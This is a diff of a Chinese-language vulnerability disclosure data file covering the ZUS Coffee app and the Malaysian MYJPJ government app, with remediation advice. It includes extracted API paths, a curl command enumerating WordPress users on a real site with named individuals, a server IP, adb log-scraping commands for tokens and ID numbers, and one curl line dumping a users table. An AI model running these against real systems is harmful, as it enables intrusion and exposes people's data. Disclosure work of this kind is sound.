-          '用户隐私安全：应用中存储的用户地址、手机号、支付记录等敏感信息面临泄露风险'
+        heading: '四、源文件列表',
+        icon: 'fa-file-code',
+        accent: '#16a085',
+        contents: [
+          {
+            type: 'subheading',
+            text: '4.1 提取到的 Dart 源文件路径'
+          },
+          {
+            type: 'paragraph',
+            text: '通过 strings 命令对 libapp.so 进行字符串提取，并使用 grep "package:love_coffee" 过滤，得到了完整的 Dart 源文件清单。这些路径暴露了应用的业务模块结构，包括登录、支付、订单、优惠券、会员等核心功能。以下为部分代表性路径：'
+          },
+          {
+            type: 'list',
+            items: [
+              'package:love_coffee/main.dart',
+              'package:love_coffee/api/api_caller.dart',
+              'package:love_coffee/api/api_response.dart',
+              'package:love_coffee/models/user_models/user.dart',
+              'package:love_coffee/models/user_models/user_registration.dart',
+              'package:love_coffee/models/order.dart',
+              'package:love_coffee/models/checkout_models/checkout.dart',
+              'package:love_coffee/models/checkout_models/cart_item.dart',
+              'package:love_coffee/models/balance_models/balance_type.dart',
+              'package:love_coffee/models/voucher_models/voucher.dart',
+              'package:love_coffee/models/store_models/store.dart',
+              'package:love_coffee/models/product_models/product.dart',
+              'package:love_coffee/models/referral_models/referral_info.dart',
+              'package:love_coffee/models/gift_card_models/gift_card.dart',
+              'package:love_coffee/models/payment_models/payment_method.dart',
+              'package:love_coffee/providers/auth_provider.dart',
+              'package:love_coffee/providers/checkout_provider.dart',
+              'package:love_coffee/providers/order_provider.dart',
+              'package:love_coffee/providers/user_provider.dart',
+              'package:love_coffee/screens/login_signup/login_signup.dart',
+              'package:love_coffee/screens/checkout_processing/checkout_processing_page.dart',
+              'package:love_coffee/screens/zus_balance/zus_balance_main.dart',
+              'package:love_coffee/screens/voucher/voucher_main.dart',
+              'package:love_coffee/services/Post_api_service.dart',
+              'package:love_coffee/services/Get_api_service.dart',
+              'package:love_coffee/services/firebase_analytics.dart',
+              'package:love_coffee/managers/one_signal_manager.dart',
+              'package:love_coffee/managers/molpay_manager.dart',
+              'package:love_coffee/constants/constants.dart',
+              'package:love_coffee/global_variable/Global_variable.dart'
+            ]
+          },
+          {
+            type: 'paragraph',
+            text: '完整的源文件列表超过 300 项，涵盖了应用的所有业务模块。攻击者通过分析这些文件路径即可还原应用的整体架构与业务流程，结合逆向工具可进一步获取具体实现逻辑。'
+          }
         ]
       },
       {
-        heading: '六、加固建议',
-        body: '针对 Flutter 应用的安全加固，建议从代码混淆、Flutter 专用加固和安全编码最佳实践三个层面进行：',
-        listItems: [
-          '代码混淆：启用 Flutter 的 --obfuscate --split-debug-info 编译选项进行 Dart 代码混淆；使用 ProGuard / R8 对 Java/Kotlin 原生层代码进行混淆',
-          'Flutter 加固：使用专业的 Flutter 加固方案（如网易易盾、腾讯乐固 Flutter 版、360 加固）对 libapp.so 进行加壳保护；实施 Flutter 代码虚拟化保护（VMP），将关键代码转换为自定义虚拟机指令',
-          '安全最佳实践：敏感数据不硬编码在客户端，使用 Secure Storage / Keychain / Keystore 存储；关键业务逻辑（支付验证、积分计算）放在服务端处理；启用 SSL Pinning 防止中间人攻击；实施运行时环境检测（Root/越狱检测、调试器检测、模拟器检测）；本地数据库加密（Hive 加密、SQLCipher）'
-        ],
-        codeBlock: '// Flutter 代码混淆编译命令示例\nflutter build apk --obfuscate --split-debug-info=./debug-symbols\n\n// 敏感信息安全存储示例（使用 flutter_secure_storage）\nimport \'package:flutter_secure_storage/flutter_secure_storage.dart\';\n\nfinal storage = FlutterSecureStorage();\n\n// 存储 Token（而非硬编码）\nawait storage.write(key: \'api_token\', value: token);\n\n// 读取 Token\nString? token = await storage.read(key: \'api_token\');',
-        codeLang: 'dart'
+        heading: '五、API 路径搜索结果',
+        icon: 'fa-network-wired',
+        accent: '#2980b9',
+        contents: [
+          {
+            type: 'subheading',
+            text: '5.1 API 路径提取方法'
+          },
+          {
+            type: 'paragraph',
+            text: '通过 strings source/libapp.so | grep "/api/v1/" 与 strings source/libapp.so | grep "/api/v3/" 命令，从 libapp.so 中提取到完整的 API 路径清单。这些接口覆盖了余额、购物车、结账、用户、反馈、认证、地区等核心业务功能。'
+          },
+          {
+            type: 'subheading',
+            text: '5.2 v1 接口（余额 / 购物车 / 结账 / 用户 / 反馈）'
+          },
+          {
+            type: 'list',
+            items: [
+              '/api/v1/balance/history',
+              '/api/v1/balance/reload',
+              '/api/v1/balance/gift-card/update-gc',
+              '/api/v1/balance/gift-card/view-redeemed',
+              '/api/v1/balance/gift-card/view-sent',
+              '/api/v1/balance/gift-card/continue-payment',
+              '/api/v1/cart/add',
+              '/api/v1/cart/clear',
+              '/api/v1/checkout',
+              '/api/v1/checkout/pay',
+              '/api/v1/checkout/update/payment_method',
+              '/api/v1/orders/continue_payment',
+              '/api/v1/user/import-contact-v2',
+              '/api/v1/feedback/order_product/store'
+            ]
+          },
+          {
+            type: 'subheading',
+            text: '5.3 v3 接口（认证 / 地区）'
+          },
+          {
+            type: 'list',
+            items: [
+              '/api/v3/auth/login',
+              '/api/v3/auth/register',
+              '/api/v3/auth/phone',
+              '/api/v3/user/switch_country',
+              '/api/v3/countries'
+            ]
+          },
+          {
+            type: 'paragraph',
+            text: '掌握完整 API 结构后，攻击者可编写自动化脚本批量注册账户、爬取商品和用户数据、暴力破解密码、进行接口 fuzzing 发现更多漏洞，对系统造成严重的安全威胁。'
+          }
+        ]
+      },
+      {
+        heading: '六、敏感数据汇总表',
+        icon: 'fa-shield-alt',
+        accent: '#d35400',
+        contents: [
+          {
+            type: 'subheading',
+            text: '6.1 硬编码敏感数据清单'
+          },
+          {
+            type: 'paragraph',
+            text: '通过 AndroidManifest.xml 与 libapp.so 字符串分析，共发现以下 8 类硬编码敏感数据。所有 Key 值均已脱敏处理。'
+          },
+          {
+            type: 'table',
+            headers: ['类别', 'Key 名称', 'Key（截断显示）', '潜在风险'],
+            rows: [
+              ['Google API Keys', 'google_api_key', 'AIzaSy.....', 'API 滥用、未经授权的数据访问、资源配额耗尽'],
+              ['Google App ID', 'google_app_id', '1:60847.....', '第三方应用可能利用该 ID 进行未经授权的调用'],
+              ['Crash Reporting', 'google_crash_reporting_api_key', 'AIzaSy.....', '可伪造崩溃报告，导致敏感数据泄露'],
+              ['Facebook App ID', 'facebook_app_id', '173173.....', '可能用于伪造登录、滥用 Facebook API'],
+              ['Firebase API Key', 'firebase_database_url', 'https:api.z.....', '若安全规则配置不当，可能导致数据未经授权的读取或写入'],
+              ['Google Storage', 'google_storage_bucket', 'zuscof.....', '配置错误时可能导致敏感文件的上传或下载'],
+              ['GCM Sender ID', 'gcm_defaultSenderId', '608474.....', '可能被用于未经授权地发送推送通知，导致骚扰或钓鱼攻击'],
+              ['Branch Key', 'io.branch.sdk.BranchKey', 'key_live_.....', '可被利用来操控归因、制造虚假推荐，进而获得不正当奖励或访问敏感深链数据']
+            ]
+          },
+          {
+            type: 'warning-box',
+            icon: 'fa-exclamation-triangle',
+            text: '高危提示：上述 8 类敏感数据均在客户端硬编码，且部分为生产环境 live 密钥（如 Branch Key 为 key_live_ 前缀）。攻击者无需任何特殊权限即可通过反编译 APK 获取这些凭证，必须立即轮换并迁移至服务端管理。'
+          }
+        ]
+      },
+      {
+        heading: '七、WordPress 用户数据泄露',
+        icon: 'fa-users',
+        accent: '#c0392b',
+        contents: [
+          {
+            type: 'subheading',
+            text: '7.1 WordPress REST API 用户枚举'
+          },
+          {
+            type: 'paragraph',
+            text: '发现网站通过公开的 WordPress REST API 接口泄露用户信息，接口地址为 https://zuscoffee.com/wp-json/wp/v2/users。该接口默认开放，无需任何认证即可查询到所有 WordPress 用户的 ID、姓名、个人页面地址、头像 URL 等信息。'
+          },
+          {
+            type: 'code',
+            language: 'bash',
+            code: `# 枚举 WordPress 用户信息
+curl -s https://zuscoffee.com/wp-json/wp/v2/users | jq '.[] | {id, name, slug, link}'`
+          },
+          {
+            type: 'subheading',
+            text: '7.2 泄露的用户记录（脱敏）'
+          },
+          {
+            type: 'table',
+            headers: ['用户 ID', '姓名', 'Slug', '个人页面', 'Woocommerce ID'],
+            rows: [
+              ['7', 'Chrystal Lum', 'chrystalise', 'https://zuscoffee.com/author/chrystalise/', 'wc_user_7'],
+              ['6', 'Jamie Master', 'masterbate', 'https://zuscoffee.com/author/masterbate/', 'wc_user_6'],
+              ['5', 'Pineapple Studio', 'pineapple-studio', 'https://zuscoffee.com/author/pineapple-studio/', 'wc_user_5'],
+              ['3', 'TY', 'tingyan', 'https://zuscoffee.com/author/tingyan/', 'wc_user_3'],
+              ['1', 'zusadmin', 'zusadmin', 'https://zuscoffee.com/author/zusadmin/', 'wc_user_1']
+            ]
+          },
+          {
+            type: 'paragraph',
+            text: '风险影响：攻击者可获取用户身份信息、个人页面地址，进而实施定向钓鱼或身份冒用攻击。其中 ID 为 1 的 zusadmin 为管理员账户，其信息暴露后可能被用于针对性的暴力破解或社会工程学攻击。建议在 WordPress 配置中禁用 /wp-json/wp/v2/users 接口的公开访问。'
+          }
+        ]
+      },
+      {
+        heading: '八、漏洞复现工具',
+        icon: 'fa-wrench',
+        accent: '#8e44ad',
+        contents: [
+          {
+            type: 'subheading',
+            text: '8.1 本次安全审计使用的工具'
+          },
+          {
+            type: 'paragraph',
+            text: '以下为本次安全审计中使用的工具，开发团队可参考以复现漏洞：'
+          },
+          {
+            type: 'impact-grid',
+            cards: [
+              { icon: 'fa-key', title: 'flutter_secret_exposed', desc: '用于检测 Flutter 应用中的硬编码敏感信息，专门针对 Dart/AOT 编译产物', color: 'blue' },
+              { icon: 'fa-mobile-alt', title: 'MobileAppAnalyzer', desc: '移动应用静态分析工具，用于提取 APK/IPA 中的配置信息与密钥', color: 'purple' },
+              { icon: 'fa-search', title: 'dirleaks', desc: '目录扫描工具，用于发现隐藏的敏感文件和接口', color: 'green' },
+              { icon: 'fa-bug', title: 'Frida', desc: '动态分析工具，用于 Hook 和监控应用运行时行为，分析 libapp.so 导出符号', color: 'orange' },
+              { icon: 'fa-globe-asia', title: 'MalaysianOSINT', desc: '马来西亚地区开源情报收集工具，用于辅助目标信息收集', color: 'red' },
+              { icon: 'fa-rocket', title: 'metasploit-framework', desc: '漏洞利用框架，用于验证漏洞可利用性', color: 'yellow' },
+              { icon: 'fa-file-code', title: 'apktool', desc: 'APK 反编译工具，用于分析应用源码和资源', color: 'indigo' }
+            ]
+          },
+          {
+            type: 'image',
+            src: 'assets/20250326-enVzY29mZmVl-manifest.png',
+            alt: 'ZUS Coffee 漏洞影响链示意图',
+            caption: '图 1：ZUS Coffee 数据泄露影响链示意图'
+          }
+        ]
+      },
+      {
+        heading: '九、风险评估与攻击场景',
+        icon: 'fa-triangle-exclamation',
+        accent: '#c0392b',
+        contents: [
+          {
+            type: 'subheading',
+            text: '9.1 潜在攻击场景'
+          },
+          {
+            type: 'impact-grid',
+            cards: [
+              { icon: 'fa-bomb', title: 'API 滥用与数据窃取', desc: '利用 Google API Keys 和 Crash Reporting API Key 发起大量未经授权的请求，耗尽服务配额或窃取敏感数据；通过 Firebase Database URL 读取或篡改用户订单、个人信息等', color: 'red' },
+              { icon: 'fa-mask', title: '虚假推荐与会话劫持', desc: '利用 Branch Key 操控深链系统，制造虚假推荐获得不正当奖励；利用 Facebook Client Token 伪造登录请求或劫持用户会话', color: 'orange' },
+              { icon: 'fa-bell', title: '推送通知滥用', desc: '利用 GCM Sender ID 发送未经授权的推送通知，诱导用户点击钓鱼链接，实施社会工程学攻击', color: 'purple' }
+            ]
+          },
+          {
+            type: 'paragraph',
+            text: '上述攻击场景均基于本次审计中实际提取到的硬编码敏感数据。攻击者无需任何特殊权限即可通过反编译 APK 获取这些凭证，结合泄露的 API 路径清单，可对系统发起多维度的攻击。建议立即对所有泄露的密钥进行轮换，并对 Firebase 安全规则进行重新审查。'
+          }
+        ]
+      },
+      {
+        heading: '十、修复建议',
+        icon: 'fa-wrench',
+        accent: '#27ae60',
+        contents: [
+          {
+            type: 'subheading',
+            text: '10.1 代码混淆与加固'
+          },
+          {
+            type: 'paragraph',
+            text: '启用 Flutter 的代码混淆编译选项，对 Dart 代码进行符号混淆，增加逆向难度。'
+          },
+          {
+            type: 'code',
+            language: 'dart',
+            code: `// Flutter 代码混淆编译命令
+flutter build apk --obfuscate --split-debug-info=./debug-symbols
+
+// 发布时使用 --release 模式并启用 R8 混淆
+flutter build apk --release --obfuscate --split-debug-info=./debug-symbols --shrink`
+          },
+          {
+            type: 'subheading',
+            text: '10.2 敏感数据安全存储'
+          },
+          {
+            type: 'paragraph',
+            text: '敏感数据不硬编码在客户端，使用 flutter_secure_storage 进行安全存储，依托 Android Keystore / iOS Keychain 进行硬件级保护。'
+          },
+          {
+            type: 'code',
+            language: 'dart',
+            code: `import 'package:flutter_secure_storage/flutter_secure_storage.dart';
+
+final storage = FlutterSecureStorage();
+
+// 存储 Token（而非硬编码）
+await storage.write(key: 'api_token', value: token);
+
+// 读取 Token
+String? token = await storage.read(key: 'api_token');
+
+// 删除 Token
+await storage.delete(key: 'api_token');`
+          },
+          {
+            type: 'subheading',
+            text: '10.3 综合加固措施'
+          },
+          {
+            type: 'list',
+            items: [
+              '强化 Firebase 安全规则，配置细粒度的读写权限；定期更新与轮换所有第三方服务密钥；禁用 WordPress /wp-json/wp/v2/users 接口的公开访问',
+              '加固深链安全机制，对 Branch Key 进行服务端校验；实施 SSL Pinning 防止中间人攻击；启用运行时环境检测（Root/越狱检测、调试器检测、模拟器检测）',
+              '建立 API 监控与日志审计系统，对异常请求进行告警；定期审查子域配置；对开发团队进行安全培训，引入自动化安全扫描工具'
+            ]
+          },
+          {
+            type: 'success-box',
+            icon: 'fa-check-circle',
+            text: '修复验证：完成上述修复后，使用 flutter_secret_exposed 和 MobileAppAnalyzer 重新扫描 APK，确认所有硬编码密钥已被移除；使用 curl 验证 /wp-json/wp/v2/users 接口已返回 401/403；持续监控 7 天确认无异常访问记录。'
+          }
+        ]
+      },
+      {
+        heading: '十一、结论',
+        icon: 'fa-flag-checkered',
+        accent: '#2c3e50',
+        contents: [
+          {
+            type: 'conclusion',
+            title: 'ZUS Coffee 移动应用源码泄露总结',
+            text: 'ZUS Coffee 移动应用的安全审计揭示了 Flutter 应用在缺乏代码混淆和加固情况下的严重安全隐患。通过 APK 反编译、libapp.so 字符串提取和 Frida 动态分析，完整的业务逻辑、API 路径、硬编码密钥以及 WordPress 用户数据均被成功提取。该漏洞利用门槛极低，仅需标准逆向工具即可复现，建议 ZUS Coffee 立即轮换所有泄露的密钥，启用代码混淆，并将敏感配置迁移至服务端管理。'
+          },
+          {
+            type: 'info-box',
+            icon: 'fa-lightbulb',
+            text: '安全提示：Flutter 应用并非天然安全，未启用 --obfuscate 编译的 Flutter 产物可被完整逆向。建议开发团队在发布前进行移动应用安全检测，将安全审计纳入 CI/CD 流程，定期进行第三方渗透测试，以持续保障应用安全。'
+          }
+        ]
       }
     ]
   },
@@ -949,103 +2517,441 @@ curl -s "http://<TARGET_IP>:9000/exec?query=COPY+(SELECT+*+FROM+users)+TO+'/tmp/
     target: 'MYJPJ (myjpj.jpj.gov.my)',
     country: '马来西亚',
     cnvdId: 'CNVD-C-2025-176294',
-    originalUrl: '../case/20250324-24f24c.html',
+    originalUrl: '',
     framework: 'Flutter / Laravel',
     reportSections: [
       {
         heading: '善意声明',
-        body: '作为一名怀着赤诚之心的安全研究员，本次安全审计的唯一目的是帮助改进系统安全性，为保护用户数据安全尽一份力。报告中所有敏感信息均已进行脱敏处理，始终秉持"善意披露、负责任报告"的原则。所有测试均在授权范围内进行，未对系统造成任何损害，未窃取、泄露或利用任何真实用户数据。发现漏洞后，第一时间通过官方渠道提交报告，期望与相关部门协作修复问题，共同提升公共服务的安全水平。'
+        icon: 'fa-heart',
+        accent: '#e74c3c',
+        contents: [
+          {
+            type: 'info-box',
+            icon: 'fa-heart',
+            text: '作为一名怀着赤诚之心的安全研究员，我谨在此郑重声明：本次安全审计的唯一目的是帮助改进系统安全性，为保护用户数据安全尽一份力。报告中所有敏感信息均已进行脱敏处理，以防被不法分子利用。我始终秉持"善意披露、负责任报告"的原则，希望通过专业的漏洞发现和及时报告，协助开发团队尽快修复安全隐患。在此过程中，我严格遵守相关法律法规，绝无任何破坏或恶意利用的企图。衷心期待通过白帽黑客与开发团队的良性互动，共同为政府和企业的信息安全保驾护航，为广大用户筑起更坚实的数据保护屏障。'
+          }
+        ]
       },
       {
         heading: '一、漏洞概述',
-        body: 'MYJPJ 是马来西亚陆路交通局（Jabatan Pengangkutan Jalan, JPJ）的官方移动应用，基于 Flutter 跨平台框架开发，后端使用 PHP Laravel 框架部署在 F5 BIG-IP 负载均衡之后。应用为马来西亚车主提供车辆信息查询、驾照管理、 summons 查询、道路税更新等政务服务。通过 adb logcat 日志分析发现，开发团队在调试阶段直接将用户的敏感个人信息和系统认证凭证以明文形式打印到控制台日志中，任何能够访问设备日志的应用或人员均可读取这些数据。',
-        listItems: [
-          '应用名称：MYJPJ Mobile App (myjpj.jpj.gov.my)',
-          '开发框架：Flutter (Dart) / Laravel PHP',
-          '后端服务器 IP：110.159.245.15',
-          '负载均衡：F5 BIG-IP (Server: BigIP)',
-          'Web 框架：Laravel PHP Framework (X-Powered-By: PHP/7.4.x)',
-          '漏洞类型：敏感数据明文日志输出 / 个人信息泄露',
-          'CVSS 评分：9.1 (Critical)',
-          'CNVD 编号：CNVD-C-2025-176294'
+        icon: 'fa-bug',
+        accent: '#e67e22',
+        contents: [
+          {
+            type: 'subheading',
+            text: '1.1 漏洞基本信息'
+          },
+          {
+            type: 'paragraph',
+            text: 'MYJPJ 是马来西亚陆路交通局（Jabatan Pengangkutan Jalan, JPJ）的官方移动应用，基于 Flutter 跨平台框架开发，后端使用 PHP Laravel 框架部署在 F5 BIG-IP 负载均衡之后。应用为马来西亚车主提供车辆信息查询、驾照管理、summons 查询、道路税更新等政务服务。通过 adb logcat 日志分析发现，开发团队在调试阶段直接将用户的敏感个人信息和系统认证凭证以明文形式打印到控制台日志中，任何能够访问设备日志的应用或人员均可读取这些数据。'
+          },
+          {
+            type: 'table',
+            headers: ['属性', '详情'],
+            rows: [
+              ['漏洞编号', 'CNVD-C-2025-176294'],
+              ['CVSS 评分', '9.1 (Critical)'],
+              ['危害等级', '严重 (Critical)'],
+              ['目标', 'MYJPJ (myjpj.jpj.gov.my)'],
+              ['发现日期', '2025-03-20'],
+              ['漏洞类型', '敏感数据明文日志输出 / 个人信息泄露'],
+              ['开发框架', 'Flutter (Dart) / Laravel PHP'],
+              ['后端服务器 IP', '110.159.245.15'],
+              ['负载均衡', 'F5 BIG-IP (Server: BigIP)'],
+              ['Web 框架', 'Laravel PHP Framework (X-Powered-By: PHP/7.4.x)']
+            ]
+          },
+          {
+            type: 'subheading',
+            text: '1.2 应用架构'
+          },
+          {
+            type: 'impact-grid',
+            cards: [
+              { icon: 'fa-mobile-alt', title: 'Flutter 前端', desc: '基于 Flutter 跨平台框架开发，使用 Dart 语言，应用日志通过 debugPrint / print 输出到 Android logcat', color: 'blue' },
+              { icon: 'fa-server', title: 'Laravel 后端', desc: 'PHP Laravel 框架部署，提供 RESTful API 接口，处理车辆信息查询、驾照管理、summons 查询等政务服务', color: 'purple' },
+              { icon: 'fa-network-wired', title: 'F5 BIG-IP 负载均衡', desc: 'F5 BIG-IP 负载均衡器代理后端服务器，Server: BigIP，隐藏真实后端服务器 IP', color: 'orange' },
+              { icon: 'fa-key', title: 'API 认证', desc: '使用 Bearer Token / JWT 进行 API 认证，Token 直接打印到日志中，存在凭证泄露风险', color: 'red' },
+              { icon: 'fa-database', title: '敏感数据', desc: '日志中暴露身份证号 (noic/nokp)、车牌号 (nokenderaan)、家庭住址 (addres1)、用户照片 (image) 等敏感个人信息', color: 'red' }
+            ]
+          }
         ]
       },
       {
-        heading: '二、技术取证方法 — adb logcat 分析过程',
-        body: '漏洞发现通过标准的 Android 调试桥（adb）日志分析方法完成。在一台已 Root 的测试设备上安装 MYJPJ 应用，注册并登录测试账号后，执行各种功能操作（查询车辆信息、查看 summons 等），同时通过 adb logcat 实时捕获应用输出的日志。在日志中发现大量包含敏感信息的 print / debugPrint 输出。',
-        codeBlock: '# 步骤1：连接设备并确认 adb 正常工作\nadb devices\nadb shell getprop ro.build.version.release\n\n# 步骤2：清除历史日志，开始新的日志捕获\nadb logcat -c\n\n# 步骤3：过滤 MYJPJ 应用相关的日志（Flutter 应用标签通常为 flutter / Dart）\nadb logcat -v time | grep -iE "(flutter|dart|myjpj|jpj)" > myjpj_logcat.txt\n\n# 步骤4：在应用中执行操作（登录、查询车辆、查询 summons 等）\n# 然后在日志中搜索敏感关键词\n\n# 步骤5：从日志中提取敏感信息\ngrep -iE "(nokp|noic|token|password|bearer|nokenderaan|address|birth)" myjpj_logcat.txt\n\n# 步骤6：统计日志中的敏感字段数量\ngrep -oE "(nokp|noic|token|password)=[^ ,]*" myjpj_logcat.txt | wc -l',
-        codeLang: 'bash'
-      },
-      {
-        heading: '三、个人信息暴露矩阵（详细）',
-        body: '通过对日志的全面分析，共发现以下敏感字段直接以明文形式输出到日志中。下表按照信息类型、敏感级别和泄露风险进行分类：',
-        listItems: [
-          '【系统凭证类 - 极高危】Token / API Access Token：JSON Web Token (JWT) 访问令牌，泄露后可直接冒充用户调用所有 API 接口',
-          '【系统凭证类 - 极高危】AUTH BEARER：HTTP Authorization Bearer Token，同上，用于 API 认证',
-          '【系统凭证类 - 高危】ID / USER_ID：API 用户标识符，结合其他信息可进行账户接管',
-          '【系统凭证类 - 高危】PASSWORD / API_KEY：API 密钥或 JWT 刷新令牌，可长期访问系统',
-          '【个人身份类 - 极高危】noic / nokp：马来西亚身份证号码（MyKad Number），属于高度敏感个人信息，可用于身份盗用',
-          '【个人身份类 - 高危】birthDate / tarikhLahir：出生日期，配合身份证号可用于身份验证绕过',
-          '【车辆信息类 - 中危】nokenderaan / plateNumber：车牌号码，可关联车主身份信息',
-          '【位置信息类 - 高危】addres1 / alamat：家庭住址或通讯地址，属于敏感个人信息',
-          '【生物识别类 - 极高危】image / photo：用户照片（身份证照片或头像），属于生物识别信息',
-          '【身份验证类 - 高危】qrCode：用户专属二维码，可用于身份验证或登录，泄露后可能被冒用',
-          '【车辆详细信息 - 中危】vehicleBrand / vehicleModel / vehicleYear：车辆详细信息',
-          '【 summons 信息 - 中危】summonsAmount / summonsDate：交通罚单详情，涉及个人行为记录'
+        heading: '二、技术取证方法',
+        icon: 'fa-microscope',
+        accent: '#8e44ad',
+        contents: [
+          {
+            type: 'paragraph',
+            text: '漏洞发现通过标准的 Android 调试桥（adb）日志分析方法完成。在一台已 Root 的测试设备上安装 MYJPJ 应用，注册并登录测试账号后，执行各种功能操作（查询车辆信息、查看 summons 等），同时通过 adb logcat 实时捕获应用输出的日志。在日志中发现大量包含敏感信息的 print / debugPrint 输出。'
+          },
+          {
+            type: 'code',
+            code: `# 步骤1：连接设备并确认 adb 正常工作
+adb devices
+adb shell getprop ro.build.version.release
+
+# 步骤2：清除历史日志，开始新的日志捕获
+adb logcat -c
+
+# 步骤3：过滤 MYJPJ 应用相关的日志（Flutter 应用标签通常为 flutter / Dart）
+adb logcat -v time | grep -iE "(flutter|dart|myjpj|jpj)" > myjpj_logcat.txt
+
+# 步骤4：在应用中执行操作（登录、查询车辆、查询 summons 等）
+# 然后在日志中搜索敏感关键词
+
+# 步骤5：从日志中提取敏感信息
+grep -iE "(nokp|noic|token|password|bearer|nokenderaan|address|birth)" myjpj_logcat.txt
+
+# 步骤6：统计日志中的敏感字段数量
+grep -oE "(nokp|noic|token|password)=[^ ,]*" myjpj_logcat.txt | wc -l`,
+            language: 'bash'
+          },
+          {
+            type: 'image',
+            src: 'assets/20250324-24f24c.png',
+            alt: '数据泄露影响链示意图',
+            caption: 'MYJPJ 数据泄露影响链 — 从日志输出到个人信息暴露的完整攻击链路'
+          }
         ]
       },
       {
-        heading: '四、PDPA 2010 违规条款详细解释',
-        body: 'MYJPJ 应用的日志输出行为违反了马来西亚《个人数据保护法 2010》（Personal Data Protection Act 2010, PDPA）的多项核心原则。以下为详细的违规条款分析：',
-        listItems: [
-          '违反第 7 条 - 安全保护原则（Security Principle）：数据用户必须采取切实可行的措施保护个人数据，防止未经授权的访问、泄露、更改或破坏。将敏感个人数据打印到可被任意应用读取的日志中，完全违反了安全保护义务',
-          '违反第 9 条 - 数据保留原则（Retention Principle）：个人数据的保留时间不得超过实现其收集目的所需的时间。调试日志中的个人数据不属于业务必要保留，且未设置自动清理机制，构成不当保留',
-          '违反第 10 条 - 数据完整性原则（Data Integrity Principle）：数据用户必须确保个人数据准确、完整且最新。虽然不直接相关，但日志中的数据可能因未更新而过期，影响数据完整性',
-          '违反数据最小化原则（Data Minimization）：日志中包含了远超调试所需的敏感信息（完整身份证号、家庭地址、照片等），违反了最小必要原则',
-          '违反透明性原则（Transparency Principle）：应用隐私政策中未告知用户其个人数据会被记录到系统日志中，用户对此不知情',
-          '同时违反 OWASP Mobile Top 10 2024：M2 不安全数据存储（Insecure Data Storage）、M3 不安全通信（Insecure Communication）、M4 不安全身份验证（Insecure Authentication）'
+        heading: '三、个人信息暴露矩阵',
+        icon: 'fa-table',
+        accent: '#c0392b',
+        contents: [
+          {
+            type: 'paragraph',
+            text: '通过对日志的全面分析，共发现以下敏感字段直接以明文形式输出到日志中。下表按照字段名、数据类型、PDPA 分类和泄露途径进行分类整理：'
+          },
+          {
+            type: 'table',
+            headers: ['字段名', '数据类型', 'PDPA 分类', '泄露途径'],
+            rows: [
+              ['Token', 'API 访问令牌', '系统凭证', '日志输出'],
+              ['ID', 'API 用户标识', '系统标识符', '日志输出'],
+              ['PASSWORD', 'API 密钥/JWT 令牌', '认证凭证', '日志输出'],
+              ['AUTH BEARER', 'HTTP 认证令牌', '访问凭证', '请求头部'],
+              ['noic', '车主身份证号', '敏感个人信息', 'API 响应'],
+              ['nokp', '身份证号码', '敏感个人信息', 'API 响应'],
+              ['nokenderaan', '车牌号码', '车辆信息', 'API 响应'],
+              ['jnsBody', '车身类型', '车辆信息', 'API 响应'],
+              ['kodKegunaan', '车辆用途', '车辆信息', 'API 响应'],
+              ['birthDate', '出生日期', '敏感个人信息', 'API 响应'],
+              ['addres1', '地址第一行', '个人地址信息', 'API 响应'],
+              ['addres2', '地址第二行', '个人地址信息', 'API 响应'],
+              ['addres3', '地址第三行', '个人地址信息', 'API 响应'],
+              ['postcode', '邮政编码', '位置信息', 'API 响应'],
+              ['city', '城市', '位置信息', 'API 响应'],
+              ['state', '州属', '位置信息', 'API 响应'],
+              ['refNo', '交易参考号', '交易信息', 'API 响应'],
+              ['image', '用户照片', '生物识别信息', 'API 响应'],
+              ['qrCode', '用户二维码', '身份验证信息', 'API 响应']
+            ]
+          },
+          {
+            type: 'paragraph',
+            text: '从上述矩阵可以看出，日志中暴露的字段涵盖了系统凭证（Token、ID、PASSWORD、AUTH BEARER）、个人身份信息（noic、nokp、birthDate）、车辆信息（nokenderaan、jnsBody、kodKegunaan）、位置信息（addres1-3、postcode、city、state）、交易信息（refNo）以及生物识别信息（image、qrCode）。共计 19 个敏感字段，其中系统凭证类 4 处、个人信息类 12 类、API 端点 3 个，属于严重的数据泄露事件。'
+          }
+        ]
+      },
+      {
+        heading: '四、PDPA 2010 合规性分析',
+        icon: 'fa-gavel',
+        accent: '#2980b9',
+        contents: [
+          {
+            type: 'paragraph',
+            text: 'MYJPJ 应用的日志输出行为违反了马来西亚《个人数据保护法 2010》（Personal Data Protection Act 2010, PDPA）的多项核心原则。以下为详细的违规条款分析：'
+          },
+          {
+            type: 'list',
+            items: [
+              '违反第 7 条 - 安全保护原则（Security Principle）：数据用户必须采取切实可行的措施保护个人数据，防止未经授权的访问、泄露、更改或破坏。将敏感个人数据打印到可被任意应用读取的日志中，完全违反了安全保护义务',
+              '违反第 9 条 - 数据保留原则（Retention Principle）：个人数据的保留时间不得超过实现其收集目的所需的时间。调试日志中的个人数据不属于业务必要保留，且未设置自动清理机制，构成不当保留',
+              '违反第 10 条 - 数据完整性原则（Data Integrity Principle）：数据用户必须确保个人数据准确、完整且最新。虽然不直接相关，但日志中的数据可能因未更新而过期，影响数据完整性',
+              '违反数据最小化原则（Data Minimization）：日志中包含了远超调试所需的敏感信息（完整身份证号、家庭地址、照片等），违反了最小必要原则',
+              '违反透明性原则（Transparency Principle）：应用隐私政策中未告知用户其个人数据会被记录到系统日志中，用户对此不知情',
+              '同时违反 OWASP Mobile Top 10 2024：M2 不安全数据存储（Insecure Data Storage）、M3 不安全通信（Insecure Communication）、M4 不安全身份验证（Insecure Authentication）'
+            ]
+          },
+          {
+            type: 'warning-box',
+            icon: 'fa-exclamation-triangle',
+            text: '法律后果：根据 PDPA 2010，若确认违规，马来西亚个人数据保护署（PDPC）最高可处以 50 万马币罚款，相关责任人可能面临刑事处罚。此外，根据 OWASP Mobile Top 10 标准，该漏洞同时违反多项安全最佳实践，可能影响政府机构的安全合规评级。'
+          }
         ]
       },
       {
         heading: '五、CNVD 提交流程与时间线',
-        body: '漏洞已按照负责任披露（Responsible Disclosure）原则提交至国家信息安全漏洞共享平台（CNVD），并同步通知马来西亚相关部门。以下为完整的披露时间线：',
-        listItems: [
-          '2025-03-20：在安全测试中发现日志泄露敏感信息漏洞，完成初步验证',
-          '2025-03-21：进行深入分析，确认所有泄露字段，撰写详细漏洞报告',
-          '2025-03-22：通过 CNVD 在线提交系统提交漏洞报告，附件包含完整日志样本和分析报告',
-          '2025-03-23：CNVD 初审通过，分配漏洞编号 CNVD-C-2025-176294',
-          '2025-03-24：通过官方邮件 aduan@jpj.gov.my 向马来西亚陆路交通局提交漏洞报告（英文+马来文）',
-          '2025-03-25：向马来西亚个人数据保护部（PDP Department）提交 PDPA 违规投诉',
